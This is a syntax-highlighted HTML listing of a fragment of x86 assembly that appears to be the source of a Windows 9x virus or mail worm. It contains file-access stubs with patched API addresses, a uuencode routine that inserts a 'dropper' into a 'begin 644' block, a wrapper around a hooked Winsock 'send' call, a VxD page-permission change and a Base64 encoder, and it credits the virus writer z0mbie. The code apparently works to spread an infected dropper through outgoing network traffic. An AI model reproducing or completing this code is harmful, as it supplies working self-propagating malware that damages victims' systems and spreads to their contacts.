</span><span class="sc5">r3_write</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@@1</span><span class="sc0">
       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
  </span><span class="sc5">@@1</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">r3handle</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">
  </span><span class="sc5">_writefile</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">;WriteFile</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">r3_write</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc5">r3_read</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@@1</span><span class="sc0">
       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
  </span><span class="sc5">@@1</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">r3handle</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">
  </span><span class="sc5">_readfile</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">;WriteFile</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">r3_read</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc5">r3_ssof</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">66h</span><span class="sc4">,</span><span class="sc2">0b8h</span><span class="sc0">
</span><span class="sc5">r3_seof</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">r3handle</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">
  </span><span class="sc5">_seekfile</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">r3_seof</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc5">r3_ssof</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc1">;UUENCODE</span><span class="sc0">
</span><span class="sc1">;ESI=Data to encode</span><span class="sc0">
</span><span class="sc1">;EDI=Buffer</span><span class="sc0">
</span><span class="sc1">;ECX=Size of data</span><span class="sc0">
</span><span class="sc5">uuencode</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
       </span><span class="sc6">cld</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">065620A0Dh</span><span class="sc0">
       </span><span class="sc6">stosw</span><span class="sc0">
       </span><span class="sc6">stosd</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc12">' nig'</span><span class="sc0">
       </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">stosd</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc12">' 446'</span><span class="sc0">
       </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">stosd</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ninsert</span><span class="sc0">                            </span><span class="sc1">;insert dropper name</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0A0Dh</span><span class="sc0">
       </span><span class="sc6">stosw</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">                          </span><span class="sc1">;eax=size</span><span class="sc0">
       </span><span class="sc6">cdq</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">45</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
       </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                                 </span><span class="sc1">;dl=rest in last line</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                            </span><span class="sc1">;ecx=number of lines</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">                                 </span><span class="sc1">;esi=start of data</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                            </span><span class="sc1">;ebp=end of data</span><span class="sc0">
  </span><span class="sc5">@@line</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"M"</span><span class="sc0">                             </span><span class="sc1">;start of line</span><span class="sc0">
       </span><span class="sc6">stosb</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">15</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                 </span><span class="sc1">;read 15*3 =&gt; write 15*4</span><span class="sc0">
  </span><span class="sc5">@@octet</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">getbyte</span><span class="sc0">
       </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">convert</span><span class="sc0">                            </span><span class="sc1">;1st char</span><span class="sc0">
       </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
       </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00110000b</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">getbyte</span><span class="sc0">
       </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
       </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00001111b</span><span class="sc0">
       </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">convert</span><span class="sc0">                            </span><span class="sc1">;2nd char</span><span class="sc0">
       </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
       </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11111100b</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">getbyte</span><span class="sc0">
       </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">
       </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00000011b</span><span class="sc0">
       </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">convert</span><span class="sc0">                            </span><span class="sc1">;3th char</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">convert</span><span class="sc0">                            </span><span class="sc1">;4th char</span><span class="sc0">
       </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">@@octet</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0A0Dh</span><span class="sc0">
       </span><span class="sc6">stosw</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">@@line</span><span class="sc0">                             </span><span class="sc1">;do next line</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
       </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">@@end</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">                             </span><span class="sc1">;do remainder</span><span class="sc0">
       </span><span class="sc6">stosb</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
       </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">@@no_rest</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">                                  </span><span class="sc1">;octets to make</span><span class="sc0">
  </span><span class="sc5">@@no_rest</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                                  </span><span class="sc1">;is last line</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                            </span><span class="sc1">;with no rest</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@@octet</span><span class="sc0">
  </span><span class="sc5">@@end</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0650A0D60h</span><span class="sc0">                     </span><span class="sc1">;"end"</span><span class="sc0">
       </span><span class="sc6">stosd</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00A0D646Eh</span><span class="sc0">
       </span><span class="sc6">stosd</span><span class="sc0">
       </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">                      </span><span class="sc1">;cr+lf</span><span class="sc0">
       </span><span class="sc6">stosw</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">uuencode</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc5">wsock</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'WSOCK32.DLL'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">


</span><span class="sc5">convert</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
       </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00111111b</span><span class="sc0">
       </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">@@0</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
  </span><span class="sc5">@@0</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">
       </span><span class="sc6">stosb</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">convert</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc5">getbyte</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">                            </span><span class="sc1">;end of buffer?</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">@@load</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0b4h</span><span class="sc0">                                 </span><span class="sc1">;skip LODSB</span><span class="sc0">
  </span><span class="sc5">@@load</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">lodsb</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">                              </span><span class="sc1">;backup</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">getbyte</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc5">protect</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4096</span><span class="sc0">                           </span><span class="sc1">;tnz again to z0mbie!</span><span class="sc0">
       </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc0">
       </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4095</span><span class="sc0">
       </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">@@forget</span><span class="sc0">
       </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00020000h</span><span class="sc4">+</span><span class="sc2">00040000h</span><span class="sc4">)</span><span class="sc0">          </span><span class="sc1">;not writeable+user</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00010133h</span><span class="sc0">        </span><span class="sc1">;PageModifyPermissions</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">vxd</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0">  </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">
  </span><span class="sc5">@@forget</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">protect</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc5">safesend</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
       </span><span class="sc6">pusha</span><span class="sc0">
  </span><span class="sc5">@@retry</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+(</span><span class="sc2">8</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">+(</span><span class="sc2">8</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)]</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                 </span><span class="sc1">;size</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">;buffer</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">socket_out</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)]</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">oldsend</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">@@done</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0b8h</span><span class="sc0">
  </span><span class="sc5">_WSAGetLastError</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10035</span><span class="sc0">                            </span><span class="sc1">;EWOULDBLOCK?</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">@@retry</span><span class="sc0">
       </span><span class="sc6">stc</span><span class="sc0">                              </span><span class="sc1">;error</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0b1h</span><span class="sc0">
  </span><span class="sc5">@@done</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">clc</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+(</span><span class="sc2">7</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">popa</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">safesend</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc1">;esi=input</span><span class="sc0">
</span><span class="sc1">;edi=output</span><span class="sc0">
</span><span class="sc1">;eax=size</span><span class="sc0">
</span><span class="sc5">BASE64</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
       </span><span class="sc6">cld</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@@trans</span><span class="sc0">
</span><span class="sc5">trans_table</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'A'</span><span class="sc4">,</span><span class="sc12">'B'</span><span class="sc4">,</span><span class="sc12">'C'</span><span class="sc4">,</span><span class="sc12">'D'</span><span class="sc4">,</span><span class="sc12">'E'</span><span class="sc4">,</span><span class="sc12">'F'</span><span class="sc4">,</span><span class="sc12">'G'</span><span class="sc4">,</span><span class="sc12">'H'</span><span class="sc4">,</span><span class="sc12">'I'</span><span class="sc4">,</span><span class="sc12">'J'</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'K'</span><span class="sc4">,</span><span class="sc12">'L'</span><span class="sc4">,</span><span class="sc12">'M'</span><span class="sc4">,</span><span class="sc12">'N'</span><span class="sc4">,</span><span class="sc12">'O'</span><span class="sc4">,</span><span class="sc12">'P'</span><span class="sc4">,</span><span class="sc12">'Q'</span><span class="sc4">,</span><span class="sc12">'R'</span><span class="sc4">,</span><span class="sc12">'S'</span><span class="sc4">,</span><span class="sc12">'T'</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'U'</span><span class="sc4">,</span><span class="sc12">'V'</span><span class="sc4">,</span><span class="sc12">'W'</span><span class="sc4">,</span><span class="sc12">'X'</span><span class="sc4">,</span><span class="sc12">'Y'</span><span class="sc4">,</span><span class="sc12">'Z'</span><span class="sc4">,</span><span class="sc12">'a'</span><span class="sc4">,</span><span class="sc12">'b'</span><span class="sc4">,</span><span class="sc12">'c'</span><span class="sc4">,</span><span class="sc12">'d'</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'e'</span><span class="sc4">,</span><span class="sc12">'f'</span><span class="sc4">,</span><span class="sc12">'g'</span><span class="sc4">,</span><span class="sc12">'h'</span><span class="sc4">,</span><span class="sc12">'i'</span><span class="sc4">,</span><span class="sc12">'j'</span><span class="sc4">,</span><span class="sc12">'k'</span><span class="sc4">,</span><span class="sc12">'l'</span><span class="sc4">,</span><span class="sc12">'m'</span><span class="sc4">,</span><span class="sc12">'n'</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'o'</span><span class="sc4">,</span><span class="sc12">'p'</span><span class="sc4">,</span><span class="sc12">'q'</span><span class="sc4">,</span><span class="sc12">'r'</span><span class="sc4">,</span><span class="sc12">'s'</span><span class="sc4">,</span><span class="sc12">'t'</span><span class="sc4">,</span><span class="sc12">'u'</span><span class="sc4">,</span><span class="sc12">'v'</span><span class="sc4">,</span><span class="sc12">'w'</span><span class="sc4">,</span><span class="sc12">'x'</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'y'</span><span class="sc4">,</span><span class="sc12">'z'</span><span class="sc4">,</span><span class="sc12">'0'</span><span class="sc4">,</span><span class="sc12">'1'</span><span class="sc4">,</span><span class="sc12">'2'</span><span class="sc4">,</span><span class="sc12">'3'</span><span class="sc4">,</span><span class="sc12">'4'</span><span class="sc4">,</span><span class="sc12">'5'</span><span class="sc4">,</span><span class="sc12">'6'</span><span class="sc4">,</span><span class="sc12">'7'</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'8'</span><span class="sc4">,</span><span class="sc12">'9'</span><span class="sc4">,</span><span class="sc12">'+'</span><span class="sc4">,</span><span class="sc12">'/'</span><span class="sc0">
</span><span class="sc5">chars</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">                            </span><span class="sc1">;contador de caracteres</span><span class="sc0">
